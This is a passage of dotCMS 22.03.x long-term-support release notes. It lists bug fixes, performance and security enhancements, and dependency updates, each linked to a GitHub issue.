* The `sysPublishDate` field has been restored to the ElasticSearch object; it now indexes and queries properly. [[#25233](https://github.com/dotCMS/core/issues/25233)]
* Languages API no longer throws `400` errors when duplicates of non-unique keys exist. [[#24082](https://github.com/dotCMS/core/issues/24082)]
* Users with limited permissions can edit Pages and content within their purview, even if they do not have access to the Content Search tool. [[#22698](https://github.com/dotCMS/core/issues/22698)]
* Changed default Pub/Sub provider value in line with recently built Pub/Sub architecture. [[#26706](https://github.com/dotCMS/core/issues/26706)]
* Fixed reserved-name protection for `identifier` and `inode`. [[#22372](https://github.com/dotCMS/core/issues/22372)]

## dotCMS 22.03.13 [LTS](/docs/latest/lts)

##### Available: Jan 4, 2024 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Added indexes to the databases responsible for inode and identifier lookups, improving lookup performance by a factor of as much as 4600x on large sites. [[#26926](https://github.com/dotCMS/core/issues/26926)]

### Fixes

* Fixed GraphQL caching, which now behaves in the expected manner. [[#26970](https://github.com/dotCMS/core/issues/26970)]
* Restored the `catalina.out` Velocity log, once again visible in the Log Viewer. [[#26934](https://github.com/dotCMS/core/issues/26934)]

## dotCMS 22.03.12 [LTS](/docs/latest/lts)

##### Available: Dec 8, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* The [JSON viewtool](json-viewtool) now supports all JSON data types, rather than just strings. [[#21529](https://github.com/dotCMS/core/issues/21529)]
* A set of probes — for startup, readiness, and liveness — has been defined for dotCMS instances running on Kubernetes. [[#24885](https://github.com/dotCMS/core/issues/24885)]

### Fixes

* Fixed issue that could newly created content to disappear from a [Page](pages) not using the default language due to the new content's failure to inherit the correct language value. [[#18575](https://github.com/dotCMS/core/issues/18575)]
* Corrected 404 redirect routine. [[#22559](https://github.com/dotCMS/core/issues/22559)]
* Fixed bug preventing content from exporting when all languages are selected. [[#19734](https://github.com/dotCMS/core/issues/19734)]
* [Relationship](relationships) fields now properly update via Workflow API calls. [[#24167](https://github.com/dotCMS/core/issues/24167)]
* Beefed up URL-Mapped content resiliency; now, if a detail page is deleted or otherwise broken, and/or a URL map pattern is absent for a given Content Type, you'll still be able to view those pages. Of course, you'll want to fix that situation, but at least you're not throwing 404s in the meantime. [[#24490](https://github.com/dotCMS/core/issues/24490)]
* MonitorResource no longer throws exceptions if `DOT_SYSTEM_STATUS_API_IP_ACL` is not set. [[#25613](https://github.com/dotCMS/core/issues/25613)]
* [Pub/Sub](https://en.wikipedia.org/wiki/Publish%E2%80%93subscribe_pattern) architecture now defaults to SSL connections, preventing failures when interfacing with PostgreSQL instances that only accept SSL. [[#26481](https://github.com/dotCMS/core/issues/26481)]
* Changes to folder values — such as title and sort order — update correctly on the receiver server when [push publishing](push-publishing). [[#26486](https://github.com/dotCMS/core/issues/26486)]

## dotCMS 22.03.11 [LTS](/docs/latest/lts)

##### Available: Nov 16, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Added two-second delay on invalid login — i.e., a nonexistent user — similar to the behavior on receiving an incorrect password. [[#23903](https://github.com/dotCMS/core/issues/23903)]

### Fixes

* Modifying a template no longer removes content from page columns, unless the column or container was expressly removed. [[#23181](https://github.com/dotCMS/core/issues/23181)]
* Fetching language keys for an unsupported language now falls back to default administrative language configured from the System → Configuration tool, rather than the default content language configured through the Types & Tags → Languages tool. [[#23777](https://github.com/dotCMS/core/issues/23777)]
* Large numbers of Site Search indexes no longer cause errors when loading the index list. [[#24816](https://github.com/dotCMS/core/issues/24816)]
* WYSIWYG fields are now once again able to reference images via their virtual path. [[#24894](https://github.com/dotCMS/core/issues/24894)]
* CMS Admin role can view all bundles, regardless of who created them. [[#25127](https://github.com/dotCMS/core/issues/25127)]
* The image processor now retains and respects a certain user-specified resampling parameter (`resize_ro`) through the entire method call, rather than reverting to a default due to a missing link in the chain. [[#25193](https://github.com/dotCMS/core/issues/25193)]
* On a [Relationship](relationships) field with the [`showFields` field variable](field-variables#RelationshipsField) set, [Binary](binary-field) and [Image](standard-field-types) fields now properly display thumbnails instead of paths. [[#25411](https://github.com/dotCMS/core/issues/25411)]
  + Likewise, if one included field is the `title` field, the correct value for each `title` will be displayed, instead of displaying the value of the first in the list across each. [[#25870](https://github.com/dotCMS/core/issues/25870)]
* Creating a new field with the same name, but different type, than a previously deleted field now correctly generates a new identifier for the field instead of incorrectly reusing the previous one. [[#25827](https://github.com/dotCMS/core/issues/25827)]
* PNG filter no longer returns a 404 when acceessing an image. [[#26374](https://github.com/dotCMS/core/issues/26374)]
* Global CORS header now respect configuration changes made through environment variables. [[#26391](https://github.com/dotCMS/core/issues/26391)]

## dotCMS 22.03.10 [LTS](/docs/latest/lts)

##### Available: Oct 3, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Built new PostgreSQL Pub/Sub listener to replace the impossibl Postgres driver with a vanilla one. This gives us a better diagnostic view of the process, and helps rule out some factors in rare but difficult-to-diagnose cases where the driver fails to connect. [[#26019](https://github.com/dotCMS/core/issues/26019)]
* Added to the [Maintenance pane](maintenance#TabTools) the ability to restart not only a dotCMS instance, but an entire cluster. [[#22507](https://github.com/dotCMS/core/issues/22507)]
* The Multipart Web Interceptor plugin, which scans multipart or form requests that use `PUT` or `POST` to upload files, has been fully integrated into the core product. [[#21854](https://github.com/dotCMS/core/issues/21854)]

### Visual Fixes

* [Personas](personas) no longer appear in [Tag](taxonomies-and-tags#Tags) lists with a separate and distinct icon than other tags; a tag is a tag is a tag. [[#26159](https://github.com/dotCMS/core/issues/26159)]

### Fixes

* Elasticsearch queries no longer add `:persona` to a Tag field that also happens to be a Persona. Whereas the `:persona` appendage had been stripped of its meaning and function earlier this year, [in release 22.03](changelogs?v=agile#release-23.03), this is mostly a bit of tidying up. [[#26158](https://github.com/dotCMS/core/issues/26158)]
* Suggestion lists for Tag fields now properly collate tags from content deeper in the folder structure, rather than just the site root. [[#26131](https://github.com/dotCMS/core/issues/26131)]
* Radio-button fields with the Data Type set to `True/False` now correctly evaluate [values](field-properties#Radio) of `0` or `1` as valid boolean values in Elasticsearch queries. [[#26046](https://github.com/dotCMS/core/issues/26046)]
* Unnecessary XML encoding has been removed from environmental variables that originate from the Tomcat access log file. [[#23669](https://github.com/dotCMS/core/issues/23669)]
* Updated internal IP blacklists to include AWS metadata services. [[#23481](https://github.com/dotCMS/core/issues/23481)]
* Stabilized internal Tomcat path to prevent breaking changes on minor-version updates. [[#23407](https://github.com/dotCMS/core/issues/23407)]
* Restored PDF and video previews in back-end content editor. [[#23359](https://github.com/dotCMS/core/issues/23359)]
* Additional error handling procedures added to the [Scripting API](scripting-api) ensure that file handles close properly. [[#23082](https://github.com/dotCMS/core/issues/23082)]
* Widgets with WYSIWYG fields set to Code view no longer encounter value length errors when saving. [[#21855](https://github.com/dotCMS/core/issues/21855)]
* The `data-identifier` attribute will no cause an error with the contentlet editor if not spaced from the end of a tag. [[#22157](https://github.com/dotCMS/core/issues/22157)]

## dotCMS 22.03.9 [LTS](/docs/latest/lts)

##### Available: Sep 7, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Implemented lazy loading for [workflow](workflows) histories to improve load times for history-rich content. [#22068](https://github.com/dotCMS/core/issues/22068)

### Fixes

* Using Select All on <categories> before deleting no longer deletes even deselected items. [#20400](https://github.com/dotCMS/core/issues/20400)
* [Tags](taxonomies-and-tags) considered to be stored under specific sites rather than All Sites no longer fail to display. [#21904](https://github.com/dotCMS/core/issues/21904)
* PageCache now only caches with response codes of 200. [#22014](https://github.com/dotCMS/core/issues/22014)
* In the [Site Browser](site-browser), the “View Statistics” data now displays correctly; the button is removed from the menu entirely when the `ENABLE_CLICKSTREAM_TRACKING` property is set to `false`. [[#22131](https://github.com/dotCMS/core/issues/22131)]
* In the Job Scheduler, the default Site Search index is specified with `(Default)` appended to its alias. This caused the Job Scheduler to throw an error when adding a new reindex to the schedule, until that additional text was manually cleared. Well, that snag has been fixed. [[#24176](https://github.com/dotCMS/core/issues/24176)]
* The `Copy URL` button at the top of the [page viewing mode](page-viewing-modes) interfaces now copies the whole URL, and not just the path. [[#24683](https://github.com/dotCMS/core/issues/24683)]
* NavTool's `getNav` method now returns only published links. [[#24829](https://github.com/dotCMS/core/issues/24829)]
* `OPTIONS` requests to REST APIs no longer generate a `500` error status, and now return proper CORS headers. [[#25775](https://github.com/dotCMS/core/issues/25775)]
* Pagination has been restored to Content API calls with the `/related` path parameter. [[#25666](https://github.com/dotCMS/core/issues/25666)]
* Edit and Preview modes now properly reflect changes to saved draft in all cases. [[#25785](https://github.com/dotCMS/core/issues/25785)]
* Uploading multiple files will now respect the language filter when assigning the files a system language, instead of defaulting to English. [[#25797](https://github.com/dotCMS/core/issues/25797)]
* Creating a version of content in a second language no longer removes all related content from all language versions of that contentlet. [[#25896](https://github.com/dotCMS/core/issues/25896)]
* Pushing a newly created folder as a limited user with appropriate permissions no longer fails. [[#25371](https://github.com/dotCMS/core/issues/25371)]
* Mending conflicts with the Integrity Checker will no longer result in `null` values on `contentlet_as_json` database fields. [[#25229](https://github.com/dotCMS/core/issues/25229)]

### Breaking Changes

* Removed unnecessary Spring jars for better parsimony and tidiness. [#21944](https://github.com/dotCMS/core/issues/21944)

## dotCMS 22.03.8 [LTS](/docs/latest/lts)

##### Available: Aug 7, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Added new `Show Preview` button to the [page viewing mode screens](page-viewing-modes); you can now view a fully rendered preview of your changes in a new tab, outside of the context of the dotCMS back end. [[#23948](https://github.com/dotCMS/core/issues/23948)]

### Visual Improvements

* Toggling the Code view in a WYSIWYG field on Content Type that requires scrolling no longer causes the scroll position to jump. [#21492](https://github.com/dotCMS/core/issues/21492)

### Fixes

* WYSIWYG fields now accept images regardless of whether the content is in the default language; after all, even with language barriers, it's not hard to convey that you want to have your picture taken. [[#25258](https://github.com/dotCMS/core/issues/25258)]
* Mending conflicts with the Integrity Checker will no longer result in `null` values on certain database fields. [[#25224](https://github.com/dotCMS/core/issues/25224)]
* The presence or absence of a trailing slash in URLs no longer yields a different result, such as a `404` response code. [[#23276](https://github.com/dotCMS/core/issues/23276)]
* Fixed Site Browser sorting; the default pattern is to show folders first, alphabetically, and then all other items in the current folder by descending modified date. [[#25136](https://github.com/dotCMS/core/issues/25136)]
* When changing the language of a piece of content, it will likewise alter its relationships to point to versions of subordinate contentlets in the same language, where available. [[#24415](https://github.com/dotCMS/core/issues/24415)]

### Dependencies, Components, Etc.

* Removing old jaxws libraries no longer in use. [[#24843](https://github.com/dotCMS/core/issues/24843)]

## dotCMS 22.03.7 [LTS](/docs/latest/lts)

##### Available: Jun 27, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Improved clickability when [relating content](relating-content) — click anywhere in the list's rows to toggle! [[#21700](https://github.com/dotCMS/core/issues/21700)]

### Fixes

* Fixed the retrieval of Personas via Lucene query; persona tags neither require, nor yield different results with, `:persona` appended to the tag name. [[#22872](https://github.com/dotCMS/core/issues/22872)]
* The [image editor](image-editor)'s `Download` button is now once more hunky-dory. [[#23924](https://github.com/dotCMS/core/issues/23924)]
* Widgets now correctly display in non-default languages on working (i.e., draft) versions of Pages. [[#24059](https://github.com/dotCMS/core/issues/24059)]
* Fixed bug preventing a user with an ID length of more than 36 characters from locking content. [[#24133](https://github.com/dotCMS/core/issues/24133)]
* Removed a wide assortment of unnecessary cache invalidations when saving and/or updating content. This also counts as a performance optimization, though we shall list it as a fix for reasons of honor. [[#24781](https://github.com/dotCMS/core/issues/24781)]
* Creating content in more than two successive languages without leaving the content editor no longer throws an error. [[#24286](https://github.com/dotCMS/core/issues/24286)]
* Restored behavior whereby the file browser dialog shows files in the default language as a fallback if they do not exist in the requested language. [[#24444](https://github.com/dotCMS/core/issues/24444)]
* Push publishing will now properly respect timezone selections made from the dialog in the Publishing Queue's Bundles tab. [[#25037](https://github.com/dotCMS/core/issues/25037)]
* HostAPI `findAllFromDB` method now properly references variable name column. [[#21782](https://github.com/dotCMS/core/issues/21782)]
* When using the tasks page's “hamburger” button (⋮) menu, the Publish action now fires directly — i.e., the expected behavior — instead of opening the Push Publish dialog. [[#23395](https://github.com/dotCMS/core/issues/23395)]
* Folders no longer fail to push publish if they contain archived content. [[#24705](https://github.com/dotCMS/core/issues/24705)]
* For those who prefer Podman over Docker: File assets now upload properly to dotCMS containers managed via Podman. [[#24937](https://github.com/dotCMS/core/issues/24937)]
* Resolved an issue that caused content to push publish to a working (draft) state instead of a live state in the specific case where an alternate-language version of that same content exists in an archived state. (That sentence went through like eight drafts; you need to take a deep breath before summarizing a bug this particular.) [[#25044](https://github.com/dotCMS/core/issues/25044)]
* `getResizeUri` method now returns valid URLS for a resized binary image — no more double-slash shenanigans. [[#25203](https://github.com/dotCMS/core/issues/25203)]

### Breaking Changes

* Fixed a permission error that prevented a user with a custom role with appropriate permissions from using Workflow API operations. While this will not change observed behaviors, permissions-based fixes are generally classed as breaking changes due to how they may affect the hypothetical user working around them. [[#23199](https://github.com/dotCMS/core/issues/23199)]

## dotCMS 22.03.6 [LTS](/docs/latest/lts)

##### Available: May 12, 2023 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements & Adjustments

* Image permits, which control the number of threads dotCMS's image editor can occupy at once, have been made more permissive through better use of caching. They are now less likely to cap out on routine operations, without compromising their intended purpose of easing system resource burdens. [[#23807](https://github.com/dotCMS/core/issues/23807)]
* Increased number of password hash iterations from 20,000 to 600,000, in line with [current OWASP recommendations](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html#pbkdf2) for a SHA256 algorithm. [[#23915](https://github.com/dotCMS/core/issues/23915)]
* Significantly shortened startup time by optimizing vanity URL loading procedures. [[#23982](https://github.com/dotCMS/core/issues/23982)]
* Changed the way JSON Web Tokens are handled, removing an issuer check and replacing it with additional reliance on `jwt_secret.dat`. This makes possible the use of the same JWT tokens across multiple environments. [[#24395](https://github.com/dotCMS/core/issues/24395)]

### Fixes

* Fixed issue preventing content with double quotes in its title from displaying properly in a [Relationship fields](relationships). [[#23396](https://github.com/dotCMS/core/issues/23396)]
* Bad requests, such as malformed URIs, no longer result in Tomcat errors in advance of reaching custom dotCMS error pages. [[#21742](https://github.com/dotCMS/core/issues/21742)]
* Bundled content not assigned to a workflow will no longer fail to [push publish](push-publishing). [#22087](https://github.com/dotCMS/core/issues/22087)
* Resolved errors resulting from blanking an existing date field or checking “Never” on an expiration date field. [[#22667](https://github.com/dotCMS/core/issues/22667)] [[#22350](https://github.com/dotCMS/core/issues/22350)]
* Performing a health check via `/api/v1/system-status` now cleans up after itself, removing all created folders. [[#23267](https://github.com/dotCMS/core/issues/23267)]
* Image fields now filter properly according to user input. [[#23449](https://github.com/dotCMS/core/issues/23449)]
* Permissions tabs — appearing in folder properties, contentlets, templates, etc. — no longer fail to load. [[#23889](https://github.com/dotCMS/core/issues/23889)]
* Improved publishing procedures for environments with many locales and relationships, preventing slowdowns. This sounds like it should be under Enhancements, but those slowdowns could get pretty significant. So, here we are. [[#24245](https://github.com/dotCMS/core/issues/24245)]
* Leaving the “publishing” Date/time field blank on [content preset for scheduled publishing](setting-publish-and-expire-dates-for-content), no longer causes that content to re-publish if unpublished. We determined this behavior was simply too silly. [[#24344](https://github.com/dotCMS/core/issues/24344)]
* Relationship fields now correctly respect changes to their “required” status; formerly, the checkbox would display according to your changed selection, but the content would not follow suit functionally. [[#22532](https://github.com/dotCMS/core/issues/22532)]
* Updated the `/webp/` image filter to accommodate recent versions of Safari capable of rendering WebP files; now WebP is served to sufficiently new versions of Safari, and JPEG to older ones. [[#21652](https://github.com/dotCMS/core/issues/21652)]

### Enhancements & Adjustments

* Added a method to assign categories to content via Velocity, usable in a Workflow via Velocity script actionlet. [[#23009](https://github.com/dotCMS/core/issues/23009)]

### Visual Fixes

* Content Types with two Relationship fields of the same type no longer display list of crossed-out unavailable languages. [#21735](https://github.com/dotCMS/core/issues/21735)
* Fixed cases of back-end menu tools' text not displaying while collapsed. [[#23341](https://github.com/dotCMS/core/issues/23341)]
* File Browser now properly displays multilingual content, not limited by the configured user-interface language. [[#24358](https://github.com/dotCMS/core/issues/24358)]
* Fixed File Browser display behavior; now displays Page and file assets in expected fasion. [[#24272](https://github.com/dotCMS/core/issues/24272)]

### Fixes

* Fixed issue preventing saving content in a secondary language while a working/draft version exists in the default language. [[#23280](https://github.com/dotCMS/core/issues/23280)]
* Categories are no longer removed from content mass-imported via CSV file. [[#23440](https://github.com/dotCMS/core/issues/23440)]
* Saving a contentlet before its related content loads will no longer result in a clearing of the [Relationships field](relationships). [[#22323](https://github.com/dotCMS/core/issues/22323)]
* Resolved issue preventing latest upgrade for MSSQL database users. [[#23761](https://github.com/dotCMS/core/issues/23761)]
* Fixed error that caused content to disappear from a page after altering its [template](templating) or layout. [#22140](https://github.com/dotCMS/core/issues/22140)
* [Pulling related content](pull-and-display-related-content) with no sorting parameter set now returns related content in the order it was added. [#21929](https://github.com/dotCMS/core/issues/21929))
* Push Removal of a [Static Pushed](static-push-publishing-plugin) page no longer removes any other files required for that page to render. [#21832](https://github.com/dotCMS/core/issues/21832)
* Corrected an issue that prevented relating content in a [Relationship field](relationships) with Many-to-One cardinality. [[#22840](https://github.com/dotCMS/core/issues/22840)]
* Corrected the exclusion of two asset directories from back-end exports; both are now present and accounted for. [[#23810](https://github.com/dotCMS/core/issues/23810)]
* Resource consumption has been restricted on PDF thumbnail generation, decreasing system footprint and preventing out-of-memory exceptions. [[#23384](https://github.com/dotCMS/core/issues/23384)]
* Added `DOT_IMAGE_GENERATION_SIMULTANEOUS_REQUESTS` environment variable to limit the maximum number of threads image processing can consume. [[#23384](https://github.com/dotCMS/core/issues/23384)]
* Fixed the removal of categories through API calls, which no longer throws an error. [[#22756](https://github.com/dotCMS/core/issues/22756)]
* Additional error handling has been added to the `PublisherJobQueue` to improve logging and resilience. Nigh unkillable, this beast swims in magma, breathes jet exhaust, and revels in the elders' oft-whispered warning: *Hunt not the PublisherJobQueue.* [[#22850](https://github.com/dotCMS/core/issues/22850)]
* Image selector displays correct totals and respects language selection. [[#22729](https://github.com/dotCMS/core/issues/22729)]
* Resolved errors resulting from blanking an existing date field or checking “Never” on an expiration date field. [[#22667](https://github.com/dotCMS/core/issues/22667)] [[#22350](https://github.com/dotCMS/core/issues/22350)]
* Navigation no longer shows duplicate results — both requested and default languages — when requesting multilingual content in the non-default language. [[#23890](https://github.com/dotCMS/core/issues/23890)]
* Fixed issue preventing categories from being added properly to bundles. [[#23078](https://github.com/dotCMS/core/issues/23078)]
* Adding a user to a [bundle](bundles) no longer causes errors. [[#22508](https://github.com/dotCMS/core/issues/22508)]
* Language parameters update correctly when redirecting via Rule. [[#24158](https://github.com/dotCMS/core/issues/24158)]
* Copying a folder that contains Pages with both live and draft versions will no longer result in an error; duplicate your folders fearlessly. [[#24441](https://github.com/dotCMS/core/issues/24441)]
* Fixed an update task that absolutizes container paths: It erroneously added the site to the same path multiple times in certain situations. Well, not anymore. [[#24436](https://github.com/dotCMS/core/issues/24436)]

### Dependencies, Components, Etc.

* PDFBox library updated to 2.0.27. [[#23384](https://github.com/dotCMS/core/issues/23384)]

### Bugfixes

* Fixed bug that inverted the display of parent and child in many-to-one [Relationship fields](relationships). [[#22549](https://github.com/dotCMS/core/issues/22549)]
* Fixed a case where specific conditions could cause drafted content to fail to [Push Publish](push-publishing). [[#21966](https://github.com/dotCMS/core/issues/21966)]
* dotCMS now scans zip files to ensure integrity, preventing errors resulting from working with an invalid archive. [[#23401](https://github.com/dotCMS/core/issues/23401)]
* Remote-URL access tools like [`$json`](json-viewtool) or [`$import`](importtool) now run in a thread pool to avoid blocking, backups and crashes in the event of high traffic to a non-responsive external API. [[#22522](https://github.com/dotCMS/core/issues/22522)]
* Fixed issue where certain access-limited users could not switch between multiple sites on the back end. This was due to a permission correspondence between the necessary endpoint and the Sites tool, which may not be visible to the limited user. [[#23474](https://github.com/dotCMS/core/issues/23474)]
* Large bulk updates via import are now faster, via adjustments to relationship-field validation operations. Timeout troubles, begone! [[#23015](https://github.com/dotCMS/core/issues/23015)]
* Resolved erroneous difference between the [Key/Value field](key-value-field)'s import and export formatting. [[#22582](https://github.com/dotCMS/core/issues/22582)]

* Added a way to avoid cases where hashed IDs are referenced against non-hashed data in the creation of SAML users: Created `hash.userid` property (boolean) to SAML configuration to control whether the UserID is hashed or not. [[#22692](https://github.com/dotCMS/core/issues/22692)]
* Bulk adjustment of large quantities of permissions can no longer deadlock the database. [[#19358](https://github.com/dotCMS/core/issues/19358)]
* Updating a Binary field via REST API no longer removes the value from other Binary fields in the same contentlet. [[#21482](https://github.com/dotCMS/core/issues/21482)]
* Fixed [WebP filter](image-resizing-and-processing#imagefilter): no longer adds white background in Safari, and default quality no longer ruins perfectly good images. [[#21694](https://github.com/dotCMS/core/issues/21694)] [[#21652](https://github.com/dotCMS/core/issues/21652)]
* Fixed issue with database export streams that caused connection closure before file generation in instances behind a load balancer. [[#22116](https://github.com/dotCMS/core/issues/22116)]
* Users with [`Back-End User` and `Front-End User` roles](user-permissions#FrontEndBackEnd) who sign into the front end are no longer delivered to the back-end Edit Mode version of the page after manual URL entry. [[#22124](https://github.com/dotCMS/core/issues/22124)]
* When upgrading from version 5.1.6 (or older), database migration tasks now run smoothly, without errors due to differences in DB column counts. [[#22349](https://github.com/dotCMS/core/issues/22349)]
* Restored missing locales for Velocity localization operations. [[#22603](https://github.com/dotCMS/core/issues/22603)]
* Fixed a MSSQL DB error on upgrade. [[#22605](https://github.com/dotCMS/core/issues/22605)]
* Time zone data updates properly on upgrade to 22.03 or later. [[#22771](https://github.com/dotCMS/core/issues/22771)]
* Workflow changes save properly for all users, including new users or users with special characters in their name. [[#22696](https://github.com/dotCMS/core/issues/22696)]
* Fixed issue causing some navigation items to fail to display after upgrade to 22.03 or later. [[#22809](https://github.com/dotCMS/core/issues/22809)]
* Fixed the Show Archive checkbox in the Templates section. [[#21885](https://github.com/dotCMS/core/issues/21885)]

* [NavTool](navtool-viewtool)'s `getNav()` method no longer returns unpublished pages; published pages only! [[#22425](https://github.com/dotCMS/core/issues/22425)]
* [Copy Site](add-copy-sites#CopySite) copies all content; previously, the process encountered a silent cap at 10,000 items due to limits on indexes and Elasticsearch queries. [[#22520](https://github.com/dotCMS/core/issues/22520)]
* Copying a folder containing a page no longer copies the content displayed in that page's containers. [[#22763](https://github.com/dotCMS/core/issues/22763)]

### Visual Fixes

* When changing a password, verbose error message now displays when new password does not meet security requirements. [[#22204](https://github.com/dotCMS/core/issues/22204)]
* Content Palette displays larger numbers of Content Types more reliably. [[#22338](https://github.com/dotCMS/core/issues/22338)]
* The “What's Changed?” checkbox in Edit Mode now displays as checked when enabled, and correctly switches between states. [[#22673](https://github.com/dotCMS/core/issues/22673)]
* Pagination now displays properly when querying related content by REST API. [[#22236](https://github.com/dotCMS/core/issues/22236)]
* Displayed date updates correctly on menu after changing time zone. [[#23128](https://github.com/dotCMS/core/issues/23128)]
* Push publishing queue displays all bundles, even when one or more fail to publish. [[#23062](https://github.com/dotCMS/core/issues/23062)]

### Enhancements and Adjustments

* Switched to using Tomcat's `RemoteIpValve` for DNS resolution. [[#19569](https://github.com/dotCMS/core/issues/19569)]
* Removed performance drag from supporting on-the-fly configuration changes via file watchers and other blocking patterns, which are unsuited to a containerized paradigm. [[#21619](https://github.com/dotCMS/core/issues/21619)]
* Reinstated Publishing options in Template editor. [[#21612](https://github.com/dotCMS/core/issues/21612)]
* Various improvements have been implemented in upgrade routines. [[#22916](https://github.com/dotCMS/core/issues/22916)]
* Submit button disabled immediately after [Form](form-builder) submission to prevent duplicate submissions. [[#22951](https://github.com/dotCMS/core/issues/22951)]
* Implemented storage of content info as JSON for MSSQL databases — as previously implemented for PostgreSQL. [[#21219](https://github.com/dotCMS/core/issues/21219)]
* Removed various system fields — tags, categories, relationships, constants, host, and folder — from the immutable JSON object storage in the database. Folder and host are passed in during the construction of a contentlet; the rest are loaded lazily. [[#21858](https://github.com/dotCMS/core/issues/21858)]
* [Related](relationships) content spanning multiple locales has been made more performant, shortening load times. [[#22910](https://github.com/dotCMS/core/issues/22910)]
* Queued jobs have received additional failsafes against long waits for dependencies. [[#23041](https://github.com/dotCMS/core/issues/23041)]
* Improved `ContentMap` category lookups to be quicker and less expensive. [[#22864](https://github.com/dotCMS/core/issues/22864)]

### Dependencies & Components

* Minor version update to Java on Docker image. [[#22852](https://github.com/dotCMS/core/issues/22852)]
* Updated Tomcat to subsequent minor version. [[#21849](https://github.com/dotCMS/core/issues/21849)]

## dotCMS 22.03.2 [LTS](/docs/latest/lts)

##### Available: Aug 2, 2022 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

### Enhancements

* It is now possible to retrieve parent content through a child contentlet's Relationship Field by using [Lucene queries](content-search-syntax).
* Date and time fields have been modified in MSSQL databases to include time zone data.

### Bugfixes

* An error that could cause [OSGi](about-osgi) import procedures to fail has been corrected.
* `No HTML` field-validation regular expression no longer invalidates an entry if it detects a period.
* Pages with the `show_on_menu` option enabled no longer create exceptions in procedures that reorder navigation elements.
* Corrected issue that prevented limited users with sitewide viewing permissions from viewing content not explicitly permitted for their role.
* Static Push Publishing no longer fails when pushing certain Base Content Types when a default language other than English is set.
* Resolved an error that could cause OSGi import procedures to fail when a version range is specified.
* `dotParse` now properly respects all parameters of the `config` property.
* Date and time data are now updated before timezone is factored in, to prevent date and time errors during upgrades.
* Bad results on ShortyIdentifier database calls are no longer cached. This prevents a condition in which a database error could result in persistent 404 status for “shorty” IDs until their region is flushed.
* Updated SSL configuration to resolve an inactive port in the Docker image.

### Visual Fixes

* Corrected a display issue where relationship fields, on editing, sometimes appeared to change the type selection, such that a many-to-many relationship would display as a one-to-many relationship.
* Improved logo displays on back-end menus.

### Plugins

* [Fragments](osgi-plugin-exported-packages-fragments-and-extras) now only load when forced. On uploading, dotCMS reads the `Export-Package` from the fragment manifest, adds this to the OSGi-extras file, then moves the fragment to the undeployed folder and restarts the OSGi framework. This prevents interference with other plugins.
* Improved [OSGi plugin](https://www.dotcms.com/docs/latest/about-osgi) loading in server-cluster context.

## dotCMS 22.03.1 [LTS](/docs/latest/lts)

##### Available: May 11, 2022 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

`22.03.1` updates the recent [`22.03.0` LTS release](#release-22.03.0). Its changes are primarily backports from this month's `22.05` release.

### Bugfixes:

* Database connections now release properly in accordance with [`DB_MIN_IDLE` environmental variable](docker-image-configuration-options#DBConnectionPoolConfig).
* Fixed error preventing undeployment of [OSGi plugins](about-osgi).
* Pages built with [URL Mapped content](using-url-mapped-content) are now correctly created on a full-site Static Push.
  + URL Mapped content likewise shows up properly in site search indices when including folders.
* Fixed a case where specific conditions could cause drafted content to fail to [Push Publish](push-publishing).

### Content:

* Removed limit on number of widgets or forms displayed in Content Selector popup.
* Unique fields on global Content Types can now be specified as unique globally or unique per site.

## dotCMS 22.03.0 [LTS](/docs/latest/lts)

##### Available: Apr 11, 2022 Demo starter image: [20220209](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/20220209/starter-20220209.zip) Empty starter image: [20220201](https://repo.dotcms.com/artifactory/libs-release-local/com/dotcms/starter/empty_20220201/starter-empty_20220201.zip)

*(This changelog represents all changes since 21.06, spanning nine months of builds.)*

### Content Management

* Content now stored as JSON, removing limits on the number of fields.
* All dates in the system are now stored with time zone information.
* Enabled search and aggregation on key-value pairs.
* Added “bulk move” workflow action.
* Added a library of icons for Content Types.
* Added a tool for visually comparing different versions of content; access it via the History tab.
* Added a new “what's changed” library in support of the comparison tool.
